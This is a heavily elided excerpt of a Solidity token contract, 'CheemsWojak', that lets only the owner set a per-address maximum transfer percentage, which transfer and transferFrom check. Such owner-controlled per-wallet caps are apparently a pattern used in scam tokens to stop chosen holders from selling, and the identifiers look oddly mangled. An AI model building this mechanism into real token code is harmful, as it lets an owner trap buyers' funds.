...
contract CheemsWojak is Context, Ownable, IERC20 {
    ...
    mapping (address => uint256) private _maxTransferrChejak;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        uint256 senderMaxTransferLimit = _maxTransferrChejak[_msgSender()];
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        // Check for max transfer limit for the sender.
        uint256 senderMaxTransferLimit = _maxTransferrChejak[sender];
        if (senderMaxTransferLimit > 0) {
    ...
    // Additional functions for managing max transfer rChejak and trading status.
    function setMaxTransferrChejak(address account, uint256 rChejak) public onlyOwner {
        require(rChejak <= 100, "rChejak cannot exceed 100%");
        _maxTransferrChejak[account] = rChejak;
    }

    function getMaxTransferrChejak(address account) public view returns (uint256) {
        return _maxTransferrChejak[account];
    }
